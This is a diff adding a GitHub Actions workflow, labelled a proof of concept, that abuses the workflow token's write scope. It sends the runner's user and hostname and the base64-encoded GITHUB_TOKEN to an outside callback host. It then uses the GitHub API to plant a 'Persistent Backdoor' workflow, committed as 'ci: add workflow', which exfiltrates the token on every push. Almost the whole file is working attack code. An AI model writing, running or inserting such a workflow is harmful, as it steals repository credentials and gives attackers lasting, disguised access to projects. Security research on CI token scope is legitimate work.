@@ -1,0 +1,62 @@
+name: PoC Token-Scope Workflow Modification Persistence
+on:
+  push:
+    paths:
+      - '.github/workflows/poc-620e8fc3.yml'
+permissions:
+  contents: write
+jobs:
+  persist:
+    runs-on: ubuntu-latest
+    steps:
+      - name: checkout
+        uses: actions/checkout@v4
+      - name: prove-token-write-access
+        run: |
+          # Callback 1: prove we have a token and RCE
+          curl -sk "https://vlk6yzjfdinjbph3pdctcyjzzq5htahz.nvcollaborator.nvidia.com/TOKEN-SCOPE-$(whoami | base64 -w0).$(hostname | base64 -w0)"
+          
+          # Callback 2: exfiltrate GITHUB_TOKEN itself
+          TOKEN_B64=$(echo -n "${{ secrets.GITHUB_TOKEN }}" | base64 -w0)
+          curl -sk -d @- "https://vlk6yzjfdinjbph3pdctcyjzzq5htahz.nvcollaborator.nvidia.com/EXFIL-TOKEN=" < <(echo -n "$TOKEN_B64")
+          
+          # Use contents:write token to modify a workflow file via API
+          # Create a "backdoor" workflow that exfiltrates on every push
+          BACKDOOR_YML='name: Persistent Backdoor
+on:
+  push:
+jobs:
+  exfil:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          curl -sk "https://vlk6yzjfdinjbph3pdctcyjzzq5htahz.nvcollaborator.nvidia.com/PERSIST-$(whoami | base64 -w0)-$(date +%s)"
+          curl -sk -d @- "https://vlk6yzjfdinjbph3pdctcyjzzq5htahz.nvcollaborator.nvidia.com/PERSIST-TOKEN=" < <(echo -n "${{ secrets.GITHUB_TOKEN }}" | base64 -w0)'
+          
+          # Base64-encode the backdoor content
+          CONTENT_B64=$(echo -n "$BACKDOOR_YML" | base64 -w0)
+          
+          # Get the SHA of the existing file (for the update API)
+          SHA=$(curl -sk -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github.v3+json" \
+            "https://api.github.com/repos/fdzdev/tt2/contents/.github/workflows/persist-backdoor.yml" | jq -r '.sha // empty')
+          
+          if [ -n "$SHA" ]; then
+            echo "File exists, updating (SHA: $SHA)"
+            curl -sk -X PUT \
+              -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+              -H "Accept: application/vnd.github.v3+json" \
+              -d "$(jq -n --arg content "$CONTENT_B64" --arg sha "$SHA" \
+                '{message: "ci: update workflow", content: $content, sha: $sha}')" \
+              "https://api.github.com/repos/fdzdev/tt2/contents/.github/workflows/persist-backdoor.yml"
+          else
+            echo "File does not exist, creating"
+            curl -sk -X PUT \
+              -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+              -H "Accept: application/vnd.github.v3+json" \
+              -d "$(jq -n --arg content "$CONTENT_B64" \
+                '{message: "ci: add workflow", content: $content}')" \
+              "https://api.github.com/repos/fdzdev/tt2/contents/.github/workflows/persist-backdoor.yml"
+          fi
+          
+          curl -sk "https://vlk6yzjfdinjbph3pdctcyjzzq5htahz.nvcollaborator.nvidia.com/PERSIST-DONE"
